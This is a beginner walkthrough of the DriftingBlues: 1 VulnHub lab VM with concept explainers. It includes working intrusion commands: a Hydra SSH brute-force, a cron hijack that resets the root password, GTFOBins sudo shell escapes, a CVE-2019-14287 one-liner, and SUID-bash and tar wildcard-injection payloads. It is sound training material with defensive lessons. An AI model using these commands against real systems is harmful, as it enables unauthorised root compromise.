# DriftingBlues: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | DriftingBlues: 1 |
| **Difficulty** | Easy |
| **Author** | tasiyanci |
| **Released** | 11 December 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/driftingblues-1,625/> |
| **Download** | <https://vulnhub.com/entry/driftingblues-1,625/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu-based, Apache + PHP) |

> **Note:** the VM is exported from VirtualBox with DHCP enabled. Filenames, the
> password and the flag strings **vary by build**, so treat every output below as
> *illustrative* and confirm against your own target.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a host with `netdiscover`/`arp-scan` and scan it with Nmap.
- How to read a web page's **source code** and decode a **base64** string for a clue.
- How to recognise and decode an **esoteric language** (Ook!) to recover a hint.
- How **virtual-host (vhost) enumeration** reveals extra websites on one IP.
- How `robots.txt` can leak a "secret" file path.
- How recovered usernames + a partial password (plus a range of digits) feed a
  **Hydra SSH brute-force**.
- How a **cron job running `sudo`** on a file in a world-writable directory leads to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
an OVA and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# See your own IP / lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target is on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# netdiscover listens for ARP traffic and lists live hosts
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    08:00:27:xx:xx:xx      1      60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb      1      60  PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

![netdiscover finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scanning


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Full TCP sweep + service/version + default scripts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
|_http-title: Drifting Blues
```

> **Why it works:** `-p-` scans all 65,535 TCP ports; `-sV` fingerprints each service;
> `-sC` runs Nmap's safe scripts. We have a web server (80) and SSH (22).

![nmap scan of the target](images/02-nmap.png)

### 2.2 The front page and its source

Browse `http://192.168.56.101/`. It's a small "company" page. Two things stand out:

1. Two email addresses of staff members (e.g. `sheryl@driftingblues.box` and
   `eric@driftingblues.box`). **Save these — usernames matter later.**
2. A **base64** string hidden in the page source (`Ctrl+U` in the browser).

![Two staff emails and a base64 blob in the source](images/03-source-base64.png)


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
# Decode whatever base64 you found in the source
echo '<the-base64-string-from-the-source>' | base64 -d
```

```text
<the-name-of-a-text-file.txt>      # e.g. a small .txt file (varies by build)
```

> **Why it works:** base64 is *encoding*, not encryption. `base64 -d` (or CyberChef)
> trivially reverses it. The decoded value names a file to fetch next.

```bash
# Fetch the file the decoded string pointed to
curl -s http://192.168.56.101/<the-file>.txt
```

```text
Ook. Ook? Ook! Ook! Ook. Ook? ...      # looks like gibberish — it's a language!
```

### 2.3 Decoding the esoteric language

That gibberish is **Ook!**, an esoteric programming language built from the words
`Ook.`, `Ook?` and `Ook!`. Paste it into any online Ook!/Brainfuck translator.

```text
my man, i know you are new but you should know how to use host file
to reach our secret location. ~eric
```

> **Why it works:** esoteric languages are just another encoding. Recognising the
> shape (`Ook.` repeated) and running it through the right decoder recovers plain text.
> The hint says the answer is a **virtual host** — so we look for one.

![Decoding the Ook! file to a hint](images/04-ook-decode.png)

### 2.4 Virtual-host enumeration


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
# The hint is about "host files", so look for hidden vhosts on the same IP
gobuster vhost -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt \
  --append-domain -d driftingblues.box
```

```text
Found: driftingblues.box        Status: 200
Found: test.driftingblues.box   Status: 200
```

Add both names to Kali's host file so the browser and tools can reach them:

```bash
sudo tee -a /etc/hosts >/dev/null <<'EOF'
192.168.56.101  driftingblues.box
192.168.56.101  test.driftingblues.box
EOF
```

> **Why it works:** one IP can serve many websites, told apart by the `Host:` header.
> `gobuster vhost` tries many names and flags the ones that return `200`. Adding them
> to `/etc/hosts` points the names at the target IP.

Browsing `http://test.driftingblues.box/` shows a "work in progress" page.

![The hidden test.driftingblues.box virtual host](images/05-vhost.png)

### 2.5 Robots.txt leaks a secret path

```bash
gobuster dir -u http://test.driftingblues.box/ \
  -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
curl -s http://test.driftingblues.box/robots.txt
```

```text
User-agent: *
Disallow: /ssh_cred.txt
```

```bash
# robots.txt is a "do not index" list — not access control. Fetch it anyway.
curl -s http://test.driftingblues.box/ssh_cred.txt
```

```text
<something>_<something>   # an SSH password, but the LAST character is missing
                          # ...and the author tells us it is a single number 0-9
```

> **Why it works:** `robots.txt` only asks search engines not to crawl a path — it
> does **not** protect it. Naming a file there advertises it to attackers.

![robots.txt pointing at the credential file](images/06-robots.png)

---

## 3. Foothold

### 3.1 Building the password list

We have two usernames (`sheryl`, `eric`) and a password whose final **digit** we don't
know. Only ten possibilities — generate them:

```bash
# users.txt
printf 'sheryl\neric\n' > users.txt

# pass.txt: the known prefix + each digit 0-9
PREFIX='<password_without_last_char>'
for i in 0 1 2 3 4 5 6 7 8 9; do echo "${PREFIX}${i}"; done > pass.txt
cat pass.txt
```

```text
<prefix>0
<prefix>1
<prefix>2
...
<prefix>9
```

> **Why it works:** the search space is tiny (2 users × 10 passwords = 20 attempts).
> This is why any *partial* leak of a password is still a full compromise.

### 3.2 Hydra SSH brute-force


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L users.txt -P pass.txt ssh://192.168.56.101 -t 4
```

```text
[22][ssh] host: 192.168.56.101   login: eric   password: <prefix><n>
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** Hydra tries each username/password pair against `sshd`. There is no
> account lockout and the password space is tiny, so it succeeds in seconds.

```bash
ssh eric@192.168.56.101
```

```text
eric@driftingblues:~$
```

### 3.3 The user flag

```bash
id
ls -la
cat user.txt
```

```text
uid=1000(eric) gid=1000(eric) groups=1000(eric)
<the user flag — varies by build>
```

![Shell as eric and the user flag](images/07-user-flag.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Enumerate for cron / privileged jobs


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
sudo -l
cat /etc/crontab; ls -la /etc/cron*
id; uname -a
```

Directly reading cron may show nothing, because the job belongs to **root**. Use `pspy`
(no root needed) to *watch* processes as they run:

```bash
# On Kali: serve the tool
python3 -m http.server 8080    # in the dir containing pspy64

# On the target:
wget http://192.168.56.10:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

```text
CMD: UID=0  PID=1234  | /bin/sh /var/backups/backup.sh
CMD: UID=0  PID=1235  | sudo /tmp/emergency
```

> **Why it works:** `pspy` watches `procfs` events and prints every new process —
> including ones started by **root's** cron. The last line is the jackpot: root runs
> `sudo /tmp/emergency` every minute.

Let's confirm what the backup script does:

```bash
cat /var/backups/backup.sh
```

```text
#!/bin/bash
zip -r -0 /tmp/backup.zip /var/www/
sudo /tmp/emergency      # <-- runs as root, from a directory anyone can write to
```

The directory `/tmp` is world-writable and the file it calls **does not exist yet**:

```bash
ls -la /tmp/emergency
```

```text
ls: cannot access '/tmp/emergency': No such file or directory
```

> **Why it works:** classic **cron / PATH hijack** pattern. Root blindly executes a
> path we can create. Anything we put at `/tmp/emergency` runs as root on the next tick.

![pspy revealing the root cron job](images/08-pspy-cron.png)

### 4.2 Hijacking the cron job

```bash
# Create the file root is looking for; give it a root password change
cat > /tmp/emergency <<'EOF'
#!/bin/bash
echo -e "pwned\npwned" | passwd root
EOF
chmod +x /tmp/emergency
ls -la /tmp/emergency
```

> **Why it works:** when root's cron fires `sudo /tmp/emergency`, it runs *our* script
> as root. The script pipes a new password (`pwned`) into `passwd root`, resetting the
> root account password.

Wait up to one minute, then log in as root:

```bash
su root
```

```text
Password: pwned
root@driftingblues:/home/eric#
```

```bash
id
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — varies by build>
```

> **Tip:** an alternative root path on this box is abusing a `sudo`-able binary with
> GTFOBins. Always run `sudo -l` and check GTFOBins before reaching for exploits.

![Root shell and the root flag](images/09-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive info encoded (not encrypted) in page source | base64 on the home page | Leads to the secret file + hint |
| 2 | Weak secret placed behind `robots.txt` | `/ssh_cred.txt` | Leaks a (partial) SSH password |
| 3 | Virtual host exposed on the same host | `test.driftingblues.box` | Extra attack surface / hidden app |
| 4 | Partial password + no lockout | SSH (22) | Hydra brute-forces the last digit |
| 5 | Root cron runs an untrusted, writable path | `sudo /tmp/emergency` | Arbitrary code execution as root |
| 6 | `/tmp` writable and trusted by root | `/tmp/emergency` | Root password reset → full compromise |

---

## 6. Defensive lessons (blue team)

- **Encoding is not security.** Never hide secrets in base64 in client-visible files.
- **`robots.txt` is not access control.** Put sensitive files outside the webroot and
  require authentication.
- **Don't run a single IP as many sites without review.** Audit vhosts/certs regularly
  so forgotten staging apps can't be found.
- **Enforce strong, unique passwords** and add **rate limiting / lockout / fail2ban**
  on SSH; disable password auth in favour of keys. This defeats partial-secret guessing.
- **Never run root cron on a world-writable path.** Use root-owned directories with
  strict permissions, absolute paths, and `PATH` set explicitly.
- **Least privilege for cron.** If a job doesn't need root, don't give it root.
- **Monitoring:** alert on root-owned processes launched from `/tmp`, on new files in
  `/tmp` that get executed, and on `passwd`/`shadow` changes outside change windows.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — DriftingBlues: 1: <https://vulnhub.com/entry/driftingblues-1,625/>
- InfoSec Write-ups — DriftingBlues: 1 Walkthrough:
  <https://infosecwriteups.com/driftingblues-1-vulnhub-write-up-walkthrough-cafcbd6358d>
- `pspy` — monitor processes without root: <https://github.com/DominicBreuker/pspy>
- GTFOBins — living-off-the-land binaries: <https://gtfobins.github.io/>
- OWASP — Insecure Direct Object / information exposure: <https://owasp.org/www-project-top-ten/>
- Hydra — network login brute-forcer: <https://github.com/vanhauser-thc/thc-hydra>
- Ook!/Brainfuck decoder: <https://www.cachesleuth.com/bfook.html>
- CyberChef — the "cyber swiss army knife": <https://gchq.github.io/CyberChef/>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover/arp-scan
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-source-base64.png` — emails + base64 in the page source
- [ ] `images/04-ook-decode.png` — decoding the Ook! file to a hint
- [ ] `images/05-vhost.png` — the hidden `test.driftingblues.box` site
- [ ] `images/06-robots.png` — `robots.txt` pointing at the credential file
- [ ] `images/07-user-flag.png` — shell as `eric` and the user flag
- [ ] `images/08-pspy-cron.png` — pspy showing the root cron job
- [ ] `images/09-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
